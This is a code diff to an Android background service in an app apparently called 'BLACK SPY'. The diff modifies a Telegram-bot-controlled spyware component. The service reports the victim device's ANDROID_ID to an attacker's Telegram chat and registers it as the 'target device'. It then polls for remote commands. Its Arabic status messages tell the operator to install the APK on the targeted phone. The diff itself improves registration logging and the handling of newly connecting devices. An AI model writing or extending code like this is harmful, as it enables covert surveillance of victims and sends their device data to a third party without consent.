@@ -51,16 +51,17 @@ public class TelegramBotService extends Service {
     private int lastUpdateId = 0;
     private String targetDeviceId = null;
     private String targetDeviceName = null;
+    private boolean deviceRegistered = false;
     private MediaRecorder mediaRecorder;
     private String currentAudioPath;
     private boolean isRecording = false;
     @Override public void onCreate() { 
         super.onCreate(); 
         startForeground(1, createNotification()); 
-        registerThisDevice();
-        startBot(); 
+        startBot();
+        sendRegistration(); 
     }
-    private void registerThisDevice() {
+    private void sendRegistration() {
         new Thread(() -> {
             try {
                 String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -72,9 +73,14 @@ public class TelegramBotService extends Service {
                 String url = API_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
                 HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
-                conn.getResponseCode();
+                int code = conn.getResponseCode();
                 conn.disconnect();
-            } catch (Exception e) {}
+                if (code == 200) {
+                    Log.i("BlackSpy", "Registration sent successfully");
+                }
+            } catch (Exception e) {
+                Log.e("BlackSpy", "Registration error: " + e.getMessage());
+            }
         }).start();
     }
     private void startBot() {
@@ -96,13 +102,20 @@ public class TelegramBotService extends Service {
                             } else if (text.startsWith("REGISTER:")) {
                                 String data = text.replace("REGISTER:", "");
                                 JSONObject info = new JSONObject(data);
+                                String deviceId = info.getString("device_id");
+                                String deviceName = info.getString("device_name");
                                 if (targetDeviceId == null) {
-                                    targetDeviceId = info.getString("device_id");
-                                    targetDeviceName = info.getString("device_name");
-                                    sendMessage("✅ الجهاز المستهدف: " + targetDeviceName);
+                                    targetDeviceId = deviceId;
+                                    targetDeviceName = deviceName;
+                                    deviceRegistered = true;
+                                    sendMessage("✅ BLACK SPY ONLINE ✅\n📍 الجهاز: " + deviceName);
                                     sendCommandMenu();
-                                } else {
-                                    sendMessage("⚠️ جهاز جديد حاول الاتصال ولكن تم تجاهله. الجهاز النشط حالياً: " + targetDeviceName);
+                                } else if (!deviceRegistered) {
+                                    targetDeviceId = deviceId;
+                                    targetDeviceName = deviceName;
+                                    deviceRegistered = true;
+                                    sendMessage("✅ BLACK SPY ONLINE ✅\n📍 الجهاز: " + deviceName);
+                                    sendCommandMenu();
                                 }
                             }
                         }
@@ -115,7 +128,7 @@ public class TelegramBotService extends Service {
         String c = cmd.trim().toLowerCase();
         if (c.equals("/start")) {
             if (targetDeviceId == null) {
-                sendMessage("🔥 BLACK SPY 🔥\n\n❌ لا يوجد جهاز مستهدف بعد\n⏳ انتظر اتصال جهاز...");
+                sendMessage("🔥 BLACK SPY 🔥\n\n⏳ جاري انتظار اتصال الجهاز...\n✅ تأكد من تثبيت APK على الجهاز المستهدف");
             } else {
                 sendCommandMenu();
             }
